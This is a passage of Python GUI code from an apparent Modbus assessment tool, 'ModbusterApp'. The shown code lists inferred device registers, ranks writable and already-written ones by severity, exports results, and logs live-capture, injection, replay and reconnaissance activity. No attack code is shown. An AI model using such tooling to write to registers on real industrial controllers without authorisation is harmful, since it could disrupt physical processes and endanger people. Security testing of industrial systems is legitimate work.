        prev_key = None
        for r in results:
            key = (r["ip"], r["unit_id"])
            if prev_key is not None and key != prev_key:
                lines.append("")
            prev_key = key
            last = str(r["last_value"]) if r["last_value"] is not None else "—"
            rng  = f"{r['min']}–{r['max']}" if r["min"] is not None else "—"
            hint = r["hint"].split(".")[0][:55]   # first sentence, truncated
            w_flag = "⚡" if r["writable"] else "  "
            ip_col = (r["ip"] or "unknown")[:15]
            lines.append(
                f"{ip_col:<15}  {r['unit_id']:>2} {r['addr']:>3}  {last:>8}  "
                f"{rng:<11}  {r['confidence']:<4}  "
                f"{r['type']:<16}  {w_flag} {hint}"
            )

        body = "\n".join(lines)
        self._infer_textbox.configure(state="normal")
        scroll_pos = self._infer_textbox._textbox.yview()
        self._infer_textbox.delete("1.0", "end")
        self._infer_textbox.insert("1.0", body)
        self._infer_textbox.configure(state="disabled")
        self._infer_textbox._textbox.yview_moveto(scroll_pos[0])

        n = len(results)
        self._infer_count_label.configure(text=f"{n} register{'s' if n != 1 else ''}")
        self._infer_status.configure(
            text=f"Last refresh: {datetime.datetime.now().strftime('%H:%M:%S')}  "
                 f"— {len(self._inference.classify_all())} total registers observed")
        self._refresh_vuln_findings()

    def _toggle_vuln_findings(self) -> None:
        self._vf_visible = not self._vf_visible
        arrow = "▼" if self._vf_visible else "▶"
        self._vf_toggle_btn.configure(text=f"{arrow}  VULNERABILITY FINDINGS")
        if self._vf_visible:
            self._vf_panel.pack(fill="x", pady=(2, 0))
        else:
            self._vf_panel.pack_forget()

    def _refresh_vuln_findings(self) -> None:
        """Rebuild the vulnerability findings strip from current session data."""
        _SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        classifications = self._inference.classify_all()
        written = self._inject_written

        # Score every writable or written register
        rows: list[tuple[str, str, int, int, str, bool]] = []  # (sev, ip, uid, addr, rtype, was_written)
        for r in classifications:
            ip, uid, addr = r.get("ip", ""), r["unit_id"], r["addr"]
            was_written = (ip, uid, addr) in written
            if not was_written and not r.get("writable"):
                continue
            sev = _report._score(r, written)
            rows.append((sev, ip, uid, addr, r.get("type", "?"), was_written))

        rows.sort(key=lambda x: (_SEV_ORDER.get(x[0], 9), x[2], x[3]))

        # Count badge
        counts = {s: 0 for s in _SEV_ORDER}
        for sev, *_ in rows:  # type: ignore[assignment]
            counts[sev] += 1
        parts = []
        for sev in ("CRITICAL", "HIGH", "MEDIUM"):
            if counts[sev]:
                parts.append(f"{counts[sev]} {sev}")
        self._vf_count_lbl.configure(
            text="  ".join(parts) if parts else "no actionable findings yet"
        )

        tb = self._vf_textbox._textbox
        tb.configure(state="normal")
        tb.delete("1.0", "end")

        self._vf_row_index = []
        if not rows:
            tb.insert("end", "  No writable registers detected yet.", "LOW")
        else:
            HDR = f"  {'Severity':<10}  {'IP':<15}  {'U':>2}  {'A':>3}  {'Type':<26}  {'Status':<14}  Context\n"
            SEP = "  " + "─" * 106 + "\n"
            tb.insert("end", HDR)
            tb.insert("end", SEP)
            for sev, ip, uid, addr, rtype, was_written in rows:
                self._vf_row_index.append((ip, uid, addr))
                ctx = _report._unit_label(uid).split(" \u2014 ")[-1] if " \u2014 " in _report._unit_label(uid) else ""
                status = "✓ Written   " if was_written else "~ Writable  "
                badge = f"[{sev:<8}]"
                tb.insert("end", f"  ")
                badge_start = tb.index("end")
                tb.insert("end", badge)
                badge_end = tb.index("end")
                tb.tag_add(sev, badge_start, badge_end)
                ip_col = (ip or "unknown")[:15]
                rest = f"  {ip_col:<15}  {uid:>2}  {addr:>3}  {rtype:<26}  "
                tb.insert("end", rest)
                status_start = tb.index("end")
                tb.insert("end", status)
                if was_written:
                    tb.tag_add("written", status_start, tb.index("end"))
                tb.insert("end", f" {ctx}\n")

        tb.configure(state="disabled")

    def _on_vf_click(self, event) -> None:
        """Click a findings row → populate IP, unit, and addr into target fields."""
        tb = self._vf_textbox._textbox
        idx = tb.index(f"@{event.x},{event.y}")
        line_no = int(idx.split(".")[0])  # 1-based
        # Rows start at line 3 (line 1 = header, line 2 = separator)
        data_row = line_no - 3
        if 0 <= data_row < len(self._vf_row_index):
            ip, uid, addr = self._vf_row_index[data_row]
            if not ip:
                ip = (sorted(self._field_devices) or sorted(self._controllers) or [self._target_ip or ""])[0]
            if ip:
                self._populate_target(ip)
            self._populate_unit_addr(uid, addr)

    def _clear_infer(self) -> None:
        self._inference.reset()
        self._refresh_infer()
        self._infer_status.configure(text="Cleared.")

    def _export_infer(self) -> None:
        import tkinter.filedialog, csv
        results = self._inference.classify_all()
        if not results:
            self._infer_status.configure(text="Nothing to export.")
            return
        path = tkinter.filedialog.asksaveasfilename(
            title="Export Inference Results",
            defaultextension=".csv",
            filetypes=[("CSV", "*.csv"), ("All files", "*.*")],
        )
        if not path:
            return
        with open(path, "w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=results[0].keys())
            w.writeheader()
            w.writerows(results)
        self._infer_status.configure(text=f"Exported {len(results)} rows → {path}")

    def _save_infer_session(self) -> None:
        from datetime import datetime
        path = tkinter.filedialog.asksaveasfilename(
            title="Save Infer Session",
            initialfile=f"infer_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            defaultextension=".json",
            filetypes=[("JSON", "*.json"), ("All files", "*.*")],
        )
        if not path:
            return
        try:
            n = self._inference.save_session(path)
            self._infer_status.configure(text=f"Saved {n} registers → {path}")
        except Exception as e:
            self._infer_status.configure(text=f"Save failed: {e}")

    def _load_infer_session(self) -> None:
        path = tkinter.filedialog.askopenfilename(
            title="Load Infer Session",
            filetypes=[("JSON", "*.json"), ("All files", "*.*")],
        )
        if not path:
            return
        try:
            n = self._inference.load_session(path, merge=False)
            self._refresh_infer()
            self._infer_status.configure(text=f"Loaded {n} registers from {path}")
        except Exception as e:
            self._infer_status.configure(text=f"Load failed: {e}")

    def _log_status(self, msg: str) -> None:
        self.status.configure(text=msg)

    def _poll_queue(self) -> None:
        had_analyze = False
        map_changed = False
        try:
            while True:
                msg = self._msg_queue.get_nowait()
                if msg[0] == "analyze_append":
                    self.analyze_text.insert("end", msg[1] + "\n")
                    self.analyze_text.see("end")
                    had_analyze = True
                elif msg[0] == "host_discovered":
                    pkt, parsed = msg[1]
                    direction = parsed.get("direction", "")
                    try:
                        src_ip = pkt["IP"].src if pkt.haslayer("IP") else None
                        dst_ip = pkt["IP"].dst if pkt.haslayer("IP") else None
                    except Exception:
                        src_ip = dst_ip = None
                    if src_ip and dst_ip:
                        local = getattr(self, "_local_ip", None)
                        before = (frozenset(self._controllers), frozenset(self._field_devices))
                        if direction == "request":
                            if src_ip != local:
                                self._controllers.add(src_ip)
                            if dst_ip != local:
                                self._field_devices.add(dst_ip)
                        elif direction == "response":
                            if src_ip != local:
                                self._field_devices.add(src_ip)
                            if dst_ip != local:
                                self._controllers.add(dst_ip)
                        after = (frozenset(self._controllers), frozenset(self._field_devices))
                        if before != after:
                            map_changed = True
                elif msg[0] == "status":
                    self._log_status(str(msg[1]))
                elif msg[0] == "live_stopped":
                    self._live_running = False
                    self.live_btn.configure(text="Start Live", fg_color=_ORANGE, hover_color=_ORANGE_HOVER)
                    if self.tabs.get() == "Analyze":
                        self._log_status("Not Capturing")
                elif msg[0] == "inject_log":
                    self.inject_log.insert("end", msg[1] + "\n")
                    self.inject_log.see("end")
                elif msg[0] == "replay_log":
                    self.replay_log.configure(state="normal")
                    self.replay_log.insert("end", msg[1] + "\n")
                    self.replay_log.see("end")
                    self.replay_log.configure(state="disabled")
                elif msg[0] == "recon_append":
                    self._recon_log.insert("end", msg[1] + "\n")
                    self._recon_log.see("end")
                elif msg[0] == "recon_status_hd":
                    self._recon_hd_status.configure(text=str(msg[1]))
                elif msg[0] == "recon_status_uid":
                    self._recon_uid_status.configure(text=str(msg[1]))
                elif msg[0] == "recon_status_reg":
                    self._recon_reg_status.configure(text=str(msg[1]))
                elif msg[0] == "recon_hd_done":
                    self._recon_hd_running = False
                    self._set_recon_btn_idle(self._recon_hd_btn)
                elif msg[0] == "recon_uid_done":
                    self._recon_uid_running = False
                    self._set_recon_btn_idle(self._recon_uid_btn)
                elif msg[0] == "recon_reg_done":
                    self._recon_reg_running = False
                    self._set_recon_btn_idle(self._recon_reg_btn)
        except queue.Empty:
            pass
        if had_analyze:
            self.analyze_text.update_idletasks()
        if map_changed:
            self._refresh_host_map()
        # Auto-refresh Infer tab every ~3 s while live capture runs
        if not hasattr(self, "_infer_tick"):
            self._infer_tick = 0
        self._infer_tick += 1
        if self._infer_tick >= 15 and self._live_running:  # 15 × 200ms = 3 s
            self._infer_tick = 0
            self._refresh_infer()
            self._refresh_auto_analysis()
            self._update_target_bar()
        self.after(200, self._poll_queue)


def main() -> None:
    app = ModbusterApp()
    app.mainloop()


if __name__ == "__main__":
    main()
